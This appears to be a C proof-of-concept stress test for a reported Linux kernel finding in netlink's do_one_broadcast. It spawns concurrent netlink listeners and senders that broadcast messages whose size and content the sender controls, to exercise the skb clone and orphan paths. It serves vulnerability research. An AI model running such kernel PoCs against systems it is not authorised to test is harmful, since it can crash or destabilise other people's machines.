/*
 * PoC for WMI-3: Attacker-Determined Content in do_one_broadcast
 * netlink_sendmsg -> netlink_broadcast -> do_one_broadcast
 *
 * Multi-threaded stress test: many listeners + many concurrent senders
 * sending large broadcasts to exercise skb_clone (line 1473) and
 * skb_get+skb_orphan (lines 1475-1480) paths aggressively.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>

#define NUM_SENDERS     8
#define NUM_LISTENERS   8
#define ITERATIONS      64
#define PAYLOAD_SIZES   {0, 1, 16, 64, 256, 1024, 4096, 16000}
#define NUM_SIZES       8

static int protocol = NETLINK_USERSOCK;
static volatile int stop = 0;
static int total_sent = 0;
static int total_recv = 0;
static pthread_mutex_t stats_lock = PTHREAD_MUTEX_INITIALIZER;

/* Listener thread: bind to group and drain messages */
static void *listener_thread(void *arg)
{
    int group = *(int *)arg;
    struct sockaddr_nl addr;
    int fd, ret;
    char buf[65536];

    fd = socket(AF_NETLINK, SOCK_RAW, protocol);
    if (fd < 0) { perror("listener: socket"); return NULL; }

    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = 1;  /* same group */
    addr.nl_pid = 0;

    ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) { perror("listener: bind"); close(fd); return NULL; }

    while (!stop) {
        struct sockaddr_nl from;
        struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
        struct msghdr msg = {
            .msg_name = &from, .msg_namelen = sizeof(from),
            .msg_iov = &iov, .msg_iovlen = 1,
        };
        ssize_t n = recvmsg(fd, &msg, MSG_DONTWAIT);
        if (n > 0) {
            pthread_mutex_lock(&stats_lock);
            total_recv++;
            pthread_mutex_unlock(&stats_lock);
        }
    }
    close(fd);
    return NULL;
}

/* Sender thread: connect and broadcast */
static void *sender_thread(void *arg)
{
    int my_id = *(int *)arg;
    int sizes[] = PAYLOAD_SIZES;
    int i, j;

    for (i = 0; i < ITERATIONS; i++) {
        for (j = 0; j < NUM_SIZES; j++) {
            int datalen = sizes[j];
            struct sockaddr_nl addr;
            struct nlmsghdr *nlh;
            struct iovec iov;
            struct msghdr msg;
            int fd, ret;
            size_t total;

            fd = socket(AF_NETLINK, SOCK_RAW, protocol);
            if (fd < 0) continue;

            /* Connect to group */
            memset(&addr, 0, sizeof(addr));
            addr.nl_family = AF_NETLINK;
            addr.nl_groups = 1;
            addr.nl_pid = 0;
            ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
            if (ret < 0) { close(fd); continue; }

            total = sizeof(struct nlmsghdr) + datalen;
            nlh = calloc(1, total);
            if (!nlh) { close(fd); continue; }

            nlh->nlmsg_len = total;
            nlh->nlmsg_type = NLMSG_NOOP;
            nlh->nlmsg_flags = 0;
            nlh->nlmsg_seq = 0;
            nlh->nlmsg_pid = 0;
            memset(NLMSG_DATA(nlh), my_id + i + j, datalen);

            memset(&msg, 0, sizeof(msg));
            iov.iov_base = nlh;
            iov.iov_len = total;
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1;

            ret = sendmsg(fd, &msg, 0);
            if (ret >= 0) {
                pthread_mutex_lock(&stats_lock);
                total_sent++;
                pthread_mutex_unlock(&stats_lock);
            }

            free(nlh);
            close(fd);

            /* Brief yield */
            if ((i + j) % 8 == 0)
                usleep(100);
        }
    }
    return NULL;
}

int main(void)
{
    pthread_t senders[NUM_SENDERS];
    pthread_t listeners[NUM_LISTENERS];
    int ids[NUM_SENDERS > NUM_LISTENERS ? NUM_SENDERS : NUM_LISTENERS];
    int i;

    printf("=== Aggressive do_one_broadcast stress test ===\n");
    printf("Listeners: %d, Senders: %d, Iterations: %d\n",
           NUM_LISTENERS, NUM_SENDERS, ITERATIONS);

    /* Start listener threads */
    for (i = 0; i < NUM_LISTENERS; i++) {
        ids[i] = i;
        if (pthread_create(&listeners[i], NULL, listener_thread, &ids[i]) != 0)
            perror("listener thread");
    }

    /* Give listeners time to bind */
    usleep(200000);

    /* Start sender threads */
    for (i = 0; i < NUM_SENDERS; i++) {
        ids[i] = i;
        if (pthread_create(&senders[i], NULL, sender_thread, &ids[i]) != 0)
            perror("sender thread");
    }

    /* Wait for senders */
    for (i = 0; i < NUM_SENDERS; i++)
        pthread_join(senders[i], NULL);

    /* Signal listeners to stop and wait */
    stop = 1;
    usleep(50000);
    for (i = 0; i < NUM_LISTENERS; i++)
        pthread_join(listeners[i], NULL);

    printf("Total sent: %d, Received: %d\n", total_sent, total_recv);
    printf("=== Done ===\n");
    return total_sent > 0 ? 0 : 1;
}
